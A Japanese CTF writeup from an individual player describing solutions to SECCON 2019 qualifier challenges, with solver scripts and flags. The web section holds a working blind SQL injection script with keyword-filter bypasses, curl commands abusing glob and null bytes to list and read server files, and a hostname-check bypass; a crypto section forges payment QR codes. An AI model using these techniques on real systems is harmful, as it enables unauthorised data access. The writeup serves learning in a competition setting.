---
date: 2019-10-21T21:44:00.000+09:00
slug: seccon-ctf-2019-quals-writeup
title: SECCON CTF 2019 Quals Writeup

---

個人で参加して 35 位。取り組めた時間が少なかったとはいえ、もうちょっとフラグを取りたかったところ。


# Welcome(Misc 50pts)


IRC に入ると Topic 上にフラグがある。


```text
SECCON{Welcome to the SECCON 2019 Online CTF}
```


# Thank you for playing!(Misc 50pts)


問題文にフラグが書いてある。この手の問題はアンケートが付いていることが多い印象だけど、今回はなし。


```text
SECCON{We have done all the challenges. Thank you!}
```


# Beeeeeeeeeer(Misc 110pt)


bash スクリプト。エスケープやシェル置換で読みづらくしているが、セミコロンで改行したり気合で解析していった。


解析結果は以下の通り
https://gist.github.com/nomeaning777/99a24af4ed90355ba7cf567278f6b8f9


最終的に一つ目のスクリプトで環境変数`S1=hogefuga`が設定され、Base64Decode された 2 つ目のスクリプトで`n`に 3 が設定され、最後に出てくるスクリプトのパスワードは`bash`となったため、フラグは以下のようになった。


```text
SECCON{hogefuga3bash}
```


# Sandstorm(Misc 279pts)


PHP の IDAT の zlib ストリームを展開したところ、ファイルサイズが(4W+1)*H になっていなかった。調べたところ、インターレス PNG はちょっと異なる形式でエンコードされているということなので、抽出するプログラムを作成した。


```ruby

# coding: ASCII-8BIT
outputs = File.binread('output')
require 'zlib'
w = 584
h = 328

pass = [
    [8, 8, 0, 0,],
    [8, 8, 4, 0,],
    [4, 8, 0, 4,],
    [4, 4, 2, 0,],
    [2, 4, 0, 2,],
    [2, 2, 1, 0,],
    [1, 2, 0, 1,],
]
sz = 0
offset = 0
pass.each.with_index(0) do |(xFactor, yFactor, xOffset, yOffset), i|
    sh = (h / yFactor)
    sw = (w / xFactor * 4 + 1)
    idat = outputs[offset, sw * sh]
    sh.times do |i|
        offset += sw
    end
    png = "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a"
    ['IHDR', 'IDAT', 'IEND'].each do |chunk|
        if chunk == 'IDAT'
            data = Zlib.deflate(idat)
            p data
        elsif chunk == 'IEND'
            data = ''
        else
            data = [w / xFactor, sh, 8, 6, 0, 0, 0].pack('NNCCCCC')
        end
        png += [data.size].pack('N')
        png += chunk
        png += data
        png += [Zlib.crc32(chunk + data)].pack("N*")
    end
    File.binwrite('output-%d.png' % i, png)
end
p sz
```


最初のファイルに QR コードが含まれていて、それを読み込ませたところフラグが表示された。


```text
SECCON{p0nlMpzlCQ5AHol6}
```


# follow-me(Reverse 225pts)


まず、PIE のバイナリなので、trace ファイルに出てくるアドレスがバイナリのものと異なるが、trace ファイルの image_load にベースのアドレスが出力されているので、それとの差分を取ることでバイナリ上のアドレスに変換する。
後は、各分岐毎に逆アセンブルや逆コンパイル結果を読んで意味を把握する。
最後に条件を満たす数値を手動+SMT ソルバーで探索した。
以下のプログラムは、SMT ソルバー(z3)を利用する Python プログラムと、数字の部分を 0 に置き変えた元の文字列を出力する。


```ruby
require 'json'
ignores = [0x5de, 0xf44, 0x765, 0x6f6, 0xf64, 0xeae, 0x630, 0x620, 0xbd6, 0x610, 0x727, 0x735, 0x650, 0x6a5]
commands = {
    0xe87 => 'main_loop',
    0xbe9 => "if cur_char != ','",
    0xc1c => "if cur_char < '0'",
    0xc22 => "if cur_char > '9'",
    0xc4f => "number",
    0xc58 => "if cur_char != '+'",
    0xcaf => "if cur_char != '-'",
    0xd06 => "if cur_char != '*'",
    0xd5d => "if cur_char != 'm'",
    0xdb4 => "if cur_char != 'M'",
    0xbef => "if state == '1'",
    0xc13 => 'state = 0',
    0x93e => 'push stack',
    0x8dc => 'pop stack', # always false
    0xdab => 'min',
    0xcfd => 'minus',
    0xe02 => 'max',
    0xa0b => 'plus(ignore)',
    0xa1f => 'arg2(plus) % 10(++)',
    0xca6 => 'plus(ignore)',
    0xa5b => 'mul(ignore)',
    0xa81 => 'arg2(mul)(++)',
    0xd54 => 'mul(ignore)',
}
stack = []
conditions = []
chars = ''
plus_num = 0
base_offset = 0
trace = JSON.parse(File.read('calc.trace'))
trace = JSON.parse(File.read('branchtrace.out'))
nums = 0
cur_arg2 = nil
trace.each do |event|
    if event['event'] == 'image_load'
        if event['image_name'].end_with?('calc')
            base_offset = event['base_addr'][2..].to_i(16)
            # p base_offset
        end
        next
    elsif event['event'] == 'exit'
        next
    end
    fail unless event['event'] == 'branch'
    taken = event['branch_taken']
    offset = event['inst_addr'][2..-1].to_i(16) - base_offset
    next if ignores.include?(offset)

    cmd = commands[offset]
    # p('%x, %s, %s' % [offset, cmd, taken])
    case offset
    when 0xc22
        chars += '0' if !taken
    when 0xbe9
        if !taken
            chars += ','
            stack << ('x' + nums.to_s)
            # p stack
            nums += 1
        end
    when 0xc58
        if !taken
            chars += '+'
            plus_num = 0
            arg2 = stack.pop
            arg1 = stack.pop
            cur_arg2 = arg2
            stack << "((#{arg1})+(#{arg2}))"
        end
    when 0xcaf
        if !taken
            chars += '-'
            arg2 = stack.pop
            arg1 = stack.pop
            stack << "((#{arg1})-(#{arg2}))"
        end
    when 0xd06
        if !taken
            chars += '*'
            arg2 = stack.pop
            conditions << "#{arg2} == 1"
            arg1 = stack.pop
            cur_arg2 = arg1
            stack << "((#{arg1})*(#{arg2}))"
        end
    when 0xd5d
        if !taken
            chars += 'm'
            arg2 = stack.pop
                arg1 = stack.pop
            stack << "min((#{arg1}), (#{arg2}))"
        end
    when 0xdb4
        if !taken
        chars += 'M'
        arg2 = stack.pop
        arg1 = stack.pop
        stack << "max((#{arg1}), (#{arg2}))"
        end
    when 0xa1f
        if taken
            plus_num += 1
        else
            # p plus_num
            conditions << "(#{cur_arg2} % 10) == #{plus_num}"
            plus_num = 0
        end
    end
    fail unless cmd
    # p chars
    # p stack
end
# p chars
nums.times do |i|
    conditions << "0 <= x#{i}"
    conditions << "x#{i} < 1000"
end
conditions << "x15 == 1"
conditions << "x16 == 1"
conditions << "x17 == 1"
conditions << "x13 == 3"
conditions << "x14 == 0"
conditions << "x11 == 0"
conditions << "x12 == 0"
conditions << "x10 == 8"
puts
puts "from z3 import *"
puts <<EOS
def min(x,y):
    return If(x>y,y,x)

def max(x,y):
    return If(x<y,y,x)

EOS
puts "s = Solver()"
puts "xs = []"
nums.times do |i|
    puts "x#{i} = Int('x#{i}')"
    puts "xs.append(x#{i})"
end
conditions.each do |c|
    puts "s.add(#{c})"
end
puts "print s.check()"
puts <<EOS
for i in xs:
    print s.model()[i].as_long()
EOS
p chars
```


プログラムの出力結果から、元の数式の候補のうちの一つ求まった。


```text
$ curl -q -H 'Content-Type:application/json' -d "{\"input\": \"008,000,000,000,000,0000,000,mm-mM-000,000,000,mm-008,000,000,003,000,-+-M+001,001,001,mm*\"}" http://follow-me.chal.seccon.jp/submit/quals/0
```


```text
SECCON{Is it easy for you to recovery input from execution trace? Keep hacking:)}
```


# PP-Keyboard(Reverse 352pts)


まず、tshark を利用して USB の通信の data 部分のみを抽出した。


```text
$ tshark -r packets.pcapng -T fields -e usb.capdata
```


data 部分は元のバイナリの次の場所で利用されている。


```c
void __fastcall sub_140001070(__int64 a1, int a2, __int64 a3, unsigned int a4)
{
  if ( a2 == 963 && a4 > 0x7F0000 )
  {
    if ( (unsigned __int8)a4 == 151 )
    {
      sub_140001010("0x%x");
    }
    else if ( (unsigned __int8)a4 == 153 )
    {
      sub_140001010(asc_140002288);
    }
  }
}
```


これを元に再現するプログラムを作成した所、フラグが得られた。


```ruby
data = File.read('capdata.txt').split
data.each do |d|
    d = [d.split(':').join[2..-1] + '00'].pack('H*').unpack1('I')
    if d > 0x7f0000
        if d % 256 == 151
            print "%x" % (((d & 0xfff) - 151) >> 8)
        elsif d % 256 == 153
            print "%x" % (((d & 0xfff) - 153) >> 8)
        end
    end
end
```


```text
SECCON{3n73r3d_fr0m_7h3_p3rf0rm4nc3_p4d_k3yb04rd}
```


# Option-Cmd-U(Web 190pts)


`http://a＠nginx/flag.php`のような文字列を URLParse すると、`a＠nginx`がホスト名となるためホスト名のチェックを通過する。HTTP からのデータの取得時には URL が idn_to_ascii によって変換されるため、`http://a@nginx/flag.php`となり、これはユーザー名`a`でホスト名が`nginx`ということになるので無事目的のサーバーにリクエストできる。


```text
SECCON{what_a_easy_bypass_314208thg0n423g}
```


# web_search(Web 212pts)


`or`や`and`がフィルターで削除されているが、これらは、`oorr`のようにすることでバイパスできる。
`,`や(半角空白)の削除はバイパスできないが、空白文字列は’(タブ)で代替することができる。
`,`の利用の JOIN による回避が思い付かず、思考停止でブラインド SQL Injection をしてしまった。


```ruby
require 'shellwords'

target = "' and '%s' < (select hex(group_concat(table_name)) from information_schema.columns WHERE table_schema = database()) ; -- " # flag,articles,articles,articles,articles,articles
target = "' and '%s' < (select hex(group_concat(column_name)) from information_schema.columns WHERE table_schema = database()) ; -- " # piece,id,title,description,reference,status
target = "' and '%s' < (select hex(piece) from flag); -- " # You_Win_Yeah}
target = "' and '%s' < (select hex(group_concat(description)) from articles where status = 1); -- " # "The flag is \"SECCON{Yeah_Sqli_Success_

def check(query)
    p query
    query.gsub!('or', 'oorr')
    query.gsub!('and', 'aandnd')
    query.gsub!(" ", "\t")
    ret = `curl -g -s #{('http://web-search.chal.seccon.jp/?q=' + query).shellescape}`
    fail ret if ret.include?("Error\n<p>\n")
    ret.size > 1000
end
result = ''
while true
    low, high = 10, 128
    while low + 1 < high
        mid = (low + high) / 2
        if check(target % ((result + mid.chr).unpack1('H*')))
            low = mid
        els
            high = mid
        end
    end
    result += low.chr
    p result
end
```


```text
SECCON{Yeah_Sqli_Success_You_Win_Yeah}
```


# File Uploader(Web 345pts)


ファイル一覧の列挙は`Dir.glob`を`'\0'`は区切り文字とする仕様を利用しておこなうことができる。


```text
$ curl -g 'http://fileserver.chal.seccon.jp:9292/%00/tmp/flags/'  --output -
```


実際のファイルの取得時には`'\0'`を含めることが出来ないので、`is_bad_char`がマッチしない`[]`を見つけたらマッチする`{}`が存在してもスルーする問題を利用して、ファイルを指定する。


```text
$ curl -g 'http://fileserver.chal.seccon.jp:9292/%7b,%5c%5b%7d/tmp/flags/gLDFPzpsZECShkdFtRXAG7u0KDWxDBtk.txt'
```


```text
SECCON{You_are_the_Globbin'_Slayer}
```


# coffee break(Crypto 56pts)


逆変換を書く


```ruby
require 'openssl'

a = 'FyRyZNBO2MG6ncd3hEkC/yeYKUseI/CxYoZiIeV2fe/Jmtwx+WbWmU1gtMX9m905'.unpack1('m')
c = OpenSSL::Cipher.new('AES-128-ECB')
c.key = "seccon2019" + "\0" * 6
b = c.update(a) + c.final
p b
key = "SECCON"
s = ''
b.size.times do|i|
    s += (((b[i].ord - 0x20) - (key[i % key.size].ord - 0x20)) % (0x7e - 0x20 + 1) + 0x20).chr
end
p s
```


```text
SECCON{Success_Decryption_Yeah_Yeah_SECCON}
```


# Zkpay(Crypto 308pts)


QR をいくつか作成してみて、zbarimg によって中身を確認すると、金額に関わらず同じ`proof`が出力されていることが分かった。


```text
username=ellie&amount=490&proof=MKhvdQyojkBCOtf1d5aBGf59usM8yFEwgmhu00mG/e4KMSAwrJktLJs1aaGUxqCWoGZ72tpDQxpEXoT4Frla+MSYTCYxCjAoJu+maSYchK542+zazOuiqwf2+3gGG05LnYQiKxLOIHSgybzA2gbXBN5ViE5uAdLXd3jGN74PBniMsjfRgegmMCAweibxPP7GPlHpyn33H0AFUax+FuizUPnccxSK4u4cWjAwCjB0nh4Wv9V8IpTG1XOrltlc4UnJ8iJITWgwIGX6vtDIETEgMBljT3MdCP3txAFVEgqeVOypvDHoAqhyue0Ib43xj5MPMAowB+V2GKdjOH8v4uFyLDkwxGE+z+o2SKHgkztUrUyW1igwCjCA3XA8lrZsMg6sqfVFh9SwaTvUW25Pvjv51VpXLXQnLDEK&hash=aa68adfa264bbf154fed93f9d0c5c04d9c172b567dc7fc08d3dd2ea063bc1cb9
username=ellie&amount=1&proof=MKhvdQyojkBCOtf1d5aBGf59usM8yFEwgmhu00mG/e4KMSAwrJktLJs1aaGUxqCWoGZ72tpDQxpEXoT4Frla+MSYTCYxCjAoJu+maSYchK542+zazOuiqwf2+3gGG05LnYQiKxLOIHSgybzA2gbXBN5ViE5uAdLXd3jGN74PBniMsjfRgegmMCAweibxPP7GPlHpyn33H0AFUax+FuizUPnccxSK4u4cWjAwCjB0nh4Wv9V8IpTG1XOrltlc4UnJ8iJITWgwIGX6vtDIETEgMBljT3MdCP3txAFVEgqeVOypvDHoAqhyue0Ib43xj5MPMAowB+V2GKdjOH8v4uFyLDkwxGE+z+o2SKHgkztUrUyW1igwCjCA3XA8lrZsMg6sqfVFh9SwaTvUW25Pvjv51VpXLXQnLDEK&hash=aa68adfa264bbf154fed93f9d0c5c04d9c172b567dc7fc08d3dd2ea063bc1cb9
```


ということで、金額をマイナスにして QR イメージを作成して、別のユーザーでその QR を読み込ませたところ、元のユーザーの金額を 1e6 以上にすることが出来た。


```text
$ qrencode -o hoge.png 'username=ellie&amount=-10000000&proof=MKhvdQyojkBCOtf1d5aBGf59usM8yFEwgmhu00mG/e4KMSAwrJktLJs1aaGUxqCWoGZ72tpDQxpEXoT4Frla+MSYTCYxCjAoJu+maSYchK542+zazOuiqwf2+3gGG05LnYQiKxLOIHSgybzA2gbXBN5ViE5uAdLXd3jGN74PBniMsjfRgegmMCAweibxPP7GPlHpyn33H0AFUax+FuizUPnccxSK4u4cWjAwCjB0nh4Wv9V8IpTG1XOrltlc4UnJ8iJITWgwIGX6vtDIETEgMBljT3MdCP3txAFVEgqeVOypvDHoAqhyue0Ib43xj5MPMAowB+V2GKdjOH8v4uFyLDkwxGE+z+o2SKHgkztUrUyW1igwCjCA3XA8lrZsMg6sqfVFh9SwaTvUW25Pvjv51VpXLXQnLDEK&hash=aa68adfa264bbf154fed93f9d0c5c04d9c172b567dc7fc08d3dd2ea063bc1cb9'
```


```text
SECCON{y0u_know_n07h1ng_3xcep7_7he_f4ct_th47_1_kn0w}
```


# Crazy Repetition of Codes(Crypto 326pts)


Zlib には CRC の拡張処理が入っていることと、CRC32 の周期が231 − 1であることを利用して繰り返し二乗法のように解いた。


Key の導出


```ruby
require 'zlib'

def crc_repeat(str, count)
    crc = Zlib.crc32(str)
    length = str.length
    res = 0
    while count > 0
        res = Zlib.crc32_combine(res, crc, length) if count.odd?
        crc = Zlib.crc32_combine(crc, crc, length)
        length = (length * 2) % (2**32 - 1)
        count /= 2
    end
    res
end

key = [
    crc_repeat('TSG', ("1" * 10000).to_i),
    crc_repeat('is', ("1" * 10000).to_i),
    crc_repeat('here', ("1" * 10000).to_i),
    crc_repeat('at', ("1" * 10000).to_i),
    crc_repeat('SECCON', ("1" * 10000).to_i),
    crc_repeat('CTF!', ("1" * 10000).to_i),
].pack('I>*')
p key.unpack('H*')
```


復号処理


```python
from Crypto.Cipher import AES

key = bytes.fromhex("b09bc54fe4a5927b8d3fef85b345bf3f5af656b0db496954")

aes = AES.new(key, AES.MODE_ECB)
encoded = aes.decrypt(bytes.fromhex('79833173d435b6c5d8aa08f790d6b0dc8c4ef525823d4ebdb0b4a8f2090ac81e'))
print(encoded)
```


```text
SECCON{Ur_Th3_L0rd_0f_the_R1NGs}
```

